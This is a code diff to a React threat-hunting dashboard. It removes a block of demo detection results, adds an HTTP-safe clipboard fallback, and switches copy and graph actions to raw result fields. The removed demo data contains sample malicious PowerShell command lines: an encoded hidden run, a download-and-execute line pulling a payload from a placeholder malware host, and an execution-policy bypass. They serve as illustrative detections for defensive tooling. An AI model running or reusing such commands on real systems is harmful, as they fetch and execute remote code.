@@ -121,55 +121,6 @@ LIMIT 200`,
 | LIMIT 200`,
 };
 
-// ─── Demo fallback ────────────────────────────────────────────────────────────
-
-// Deterministic timestamps — no Date.now() to avoid SSR hydration mismatches.
-const DEMO_RESULTS: HuntResult[] = [
-  {
-    id: 'r-001',
-    timestamp: '2026-05-06T11:48:00Z',
-    source: 'crowdstrike',
-    severity: 'high',
-    fields: {
-      host: 'WORKSTATION-042',
-      user: 'john.doe',
-      'process.name': 'powershell.exe',
-      'process.command_line':
-        'powershell.exe -nop -w hidden -enc JABXAGUAYgBDA...',
-      'process.parent.name': 'EXCEL.EXE',
-    },
-    highlight: 'powershell.exe -nop -w hidden -enc',
-  },
-  {
-    id: 'r-002',
-    timestamp: '2026-05-06T11:19:00Z',
-    source: 'defender',
-    severity: 'critical',
-    fields: {
-      host: 'SERVER-DC01',
-      user: 'svc_admin',
-      'process.name': 'powershell.exe',
-      'process.command_line':
-        "powershell.exe -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://malware.xyz/payload')\"",
-      'network.destination.ip': '185.220.101.45',
-    },
-    highlight: 'IEX (New-Object Net.WebClient).DownloadString',
-  },
-  {
-    id: 'r-003',
-    timestamp: '2026-05-06T10:00:00Z',
-    source: 'splunk',
-    severity: 'medium',
-    fields: {
-      host: 'WORKSTATION-019',
-      user: 'maria.lin',
-      'process.name': 'powershell.exe',
-      'process.command_line':
-        'powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\maria.lin\\setup.ps1',
-    },
-  },
-];
-
 const DEMO_SAVED: SavedSearch[] = [
   {
     id: 'demo-1',
@@ -214,8 +165,45 @@ function severityClass(s?: AlertSeverity) {
 }
 
 function copyToClipboard(text: string) {
-  if (typeof navigator === 'undefined' || !navigator.clipboard) return;
-  void navigator.clipboard.writeText(text).then(() => toast.success('Copied'));
+  if (typeof navigator !== 'undefined' && navigator.clipboard && window.isSecureContext) {
+    navigator.clipboard
+      .writeText(text)
+      .then(() => toast.success('Copied'))
+      .catch((err) => {
+        console.error('Clipboard copy failed:', err);
+        fallbackCopyToClipboard(text);
+      });
+    return;
+  }
+  fallbackCopyToClipboard(text);
+}
+
+// HTTP 환경 지원을 위한 Fallback 함수
+function fallbackCopyToClipboard(text: string) {
+  try {
+    const textArea = document.createElement('textarea');
+    textArea.value = text;
+    // 화면에 보이지 않도록 위치 조정
+    textArea.style.position = 'fixed';
+    textArea.style.top = '0';
+    textArea.style.left = '0';
+    textArea.style.opacity = '0';
+    document.body.appendChild(textArea);
+    textArea.focus();
+    textArea.select();
+
+    const successful = document.execCommand('copy');
+    document.body.removeChild(textArea);
+
+    if (successful) {
+      toast.success('Copied');
+    } else {
+      toast.error('Failed to copy');
+    }
+  } catch (err) {
+    console.error('Fallback copy failed:', err);
+    toast.error('Failed to copy');
+  }
 }
 
 // ─── NL hero block ───────────────────────────────────────────────────────────
@@ -614,14 +602,14 @@ function ResultRow({ result }: { result: HuntResult }) {
           </div>
           <div className="mt-3 flex flex-wrap items-center gap-2">
             <button
-              onClick={() => copyToClipboard(JSON.stringify(result.fields, null, 2))}
+              onClick={() => copyToClipboard(JSON.stringify(result.raw, null, 2))}
               className="rounded border border-slate-700/70 bg-slate-800/40 px-2 py-1 text-[11px] text-slate-300 transition-colors hover:border-slate-600 hover:bg-slate-700/40"
             >
               Copy JSON
             </button>
             <button
               onClick={() => {
-                const host = result.fields?.host;
+                const host = result.raw?.host;
                 const url = host ? `/graph?entity=${encodeURIComponent(String(host))}` : '/graph';
                 window.location.href = url;
               }}
